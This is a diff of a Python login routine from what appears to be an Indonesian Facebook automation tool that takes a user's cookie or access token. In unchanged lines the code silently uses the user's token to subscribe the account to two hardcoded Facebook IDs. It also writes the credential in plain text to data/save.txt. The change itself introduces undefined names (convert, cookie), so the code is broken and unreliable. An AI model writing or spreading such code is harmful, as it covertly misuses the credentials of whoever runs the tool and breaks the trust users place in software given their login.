@@ -313,12 +313,12 @@ def login():
 		bingung = input("[?] Login menggunakan: ")
 	if bingung in ("01","1"):
 		__cokiee = input("[?] cookie\t: ")
-		__coki = cv.Main(__cokiee).getToken()
+		__coki = convert.Main(cookie).getToken()
 		if "EAA" in __coki:
 			_cek = json.loads(req.get(f"https://graph.facebook.com/me?access_token={__coki}").text)
 			_id = _cek['id']
 			_nama = _cek['name']
-			input(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
+			print(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
 			open("data/save.txt","a").write(__coki)
 			Data(__coki,_id,_nama).menu()
 		elif "Cookies Invalid" in __coki:
@@ -333,7 +333,7 @@ def login():
 			_id = __res['id']
 			req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
 			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
-			input(f"\n[✓] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
+			print(f"\n[✓] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
 			open("data/save.txt","a").write(__token)
 			Data(__token, _id, _nama).menu()
 		except KeyError:
